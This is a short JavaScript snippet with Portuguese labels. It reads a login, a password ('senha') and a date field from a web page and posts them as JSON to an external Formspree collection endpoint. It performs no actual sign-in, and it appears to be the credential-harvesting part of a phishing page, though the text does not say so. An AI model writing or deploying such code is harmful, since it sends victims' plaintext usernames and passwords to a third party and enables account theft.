function enviar() {
    const login = document.getElementById("login").value;
    const senha = document.getElementById("senha").value;
    const data = document.getElementById("data").value;

    fetch("https://formspree.io/f/mnjbaebd", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            login: login,
            senha: senha,
            data: data
        })
    })
    .then(() => {
        document.getElementById("msg").innerText = "Dados enviados ✅";
    })
    .catch(() => {
        document.getElementById("msg").innerText = "Erro ao enviar ❌";
    });
}
